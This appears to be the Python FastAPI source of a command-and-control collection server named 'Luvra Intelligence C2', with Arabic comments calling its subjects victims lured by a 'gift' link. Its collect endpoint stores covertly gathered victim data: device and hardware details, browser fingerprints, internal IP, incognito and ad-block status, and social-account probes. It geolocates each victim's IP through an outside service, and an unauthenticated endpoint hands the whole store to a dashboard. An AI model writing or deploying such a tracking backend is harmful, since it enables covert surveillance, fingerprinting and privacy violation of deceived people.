from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
import psycopg2
from psycopg2.extras import RealDictCursor
import os, json, requests

app = FastAPI(title="Luvra Intelligence C2 - Ultra Edition")

# إعدادات قاعدة البيانات من Render
DB_URL = os.environ.get("DATABASE_URL")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

def get_db_conn():
    # اتصال آمن بقاعدة البيانات
    return psycopg2.connect(DB_URL, sslmode='require')

@app.on_event("startup")
def setup_db():
    """التأكد من أن الجدول يحتوي على كل الخانات المطلوبة قبل البدء"""
    conn = get_db_conn()
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS luvra_v3_intel (
            id SERIAL PRIMARY KEY,
            target_id TEXT,
            gift_tag TEXT,
            ip_address TEXT,
            geo_data JSONB,
            hardware_data JSONB,
            system_data JSONB,
            network_data JSONB,
            security_data JSONB,
            social_data JSONB,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    """)
    conn.commit()
    cur.close()
    conn.close()

@app.post("/api/v1/gate/collect")
async def collect_intel(request: Request):
    client_ip = request.client.host
    try:
        payload = await request.json()
        
        # سحب بيانات الموقع الجغرافي بناءً على IP الضحية
        geo_res = {}
        try:
            geo_res = requests.get(f"http://ip-api.com/json/{client_ip}").json()
        except:
            geo_res = {"status": "fail"}

        conn = get_db_conn()
        cur = conn.cursor()
        
        # تخزين "الوليمة" كاملة في الداتابيز
        cur.execute("""
            INSERT INTO luvra_v3_intel 
            (target_id, gift_tag, ip_address, geo_data, hardware_data, system_data, network_data, security_data, social_data)
            VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)
        """, (
            payload.get('target_id'),
            payload.get('gift_tag'), # نوع الهدية (الـ slug)
            client_ip,
            json.dumps(geo_res),
            json.dumps(payload.get('hardware')), # يشمل البطارية، الشحن، الـ GPU
            json.dumps(payload.get('system')),   # يشمل البصمات، التوقيت، التبويبات
            json.dumps(payload.get('network')),  # يشمل الـ IP الداخلي والسرعة
            json.dumps(payload.get('security')), # يشمل المتخفي والـ AdBlock
            json.dumps(payload.get('social_reach')) # يشمل فحص (جوجل، فيسبوك، تويتر)
        ))
        
        conn.commit()
        cur.close()
        conn.close()
        return {"status": "SUCCESS"}
    except Exception as e:
        print(f"Error captured: {e}")
        return {"status": "FAIL", "error": str(e)}

@app.get("/api/v1/analytics/full")
async def get_all_data():
    """جلب البيانات كاملة لعرضها في اللوحة"""
    try:
        conn = get_db_conn()
        cur = conn.cursor(cursor_factory=RealDictCursor)
        cur.execute("SELECT * FROM luvra_v3_intel ORDER BY created_at DESC")
        data = cur.fetchall()
        cur.close()
        conn.close()
        return data
    except Exception as e:
        return {"error": str(e)}

@app.get("/health")
def health():
    return {"status": "online", "version": "3.1.0-ultra"}
